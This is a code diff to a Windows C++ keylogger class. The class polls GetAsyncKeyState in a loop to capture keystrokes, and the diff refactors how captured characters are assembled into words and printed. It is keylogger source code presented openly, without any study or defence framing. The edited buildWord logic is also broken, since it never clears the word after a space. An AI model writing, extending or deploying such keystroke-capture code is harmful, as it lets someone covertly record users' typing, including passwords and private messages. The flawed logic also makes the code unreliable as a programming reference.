@@ -82,13 +82,28 @@ class KeyLogger {
     public: char** words;
     public: static void start()
     {
+        std::string word;
         while (true) {
             Sleep(10);
             char character = KeyLogger::catchChar();
-            // std::string word = KeyLogger::catchWord();
-            // std::cout << word;
-            std::cout << character;
+            word = KeyLogger::buildWord(character, word);
+            /*char character = KeyLogger::catchChar();
+            if (character == ' ') {
+                std::cout << word;
+                word = "";
+                continue;
+            }
+            if (character != NULL) word = word + character;*/
         }
+    }
+    public: static std::string buildWord(char character,  std::string word)
+    {
+        if (character == ' ') {
+            std::cout << word;
+            return word;
+        }
+        if (character != NULL) word = word + character;
+        return word;
     }
     public: static char catchChar()
     {
@@ -99,18 +114,7 @@ class KeyLogger {
                 return char(KEY);
             }
         }
-    }
-    public: static std::string catchWord()
-    {
-        std::string word = "";
-        char KEY = 'x';
-        for (int KEY = 8; KEY <= 190; KEY++)
-        {
-            if (GetAsyncKeyState(KEY) == -32767) {
-                if (KEY == VK_SPACE) return word;
-                word = word + char(KEY);
-            }
-        }
+        return NULL;
     }
 };
 
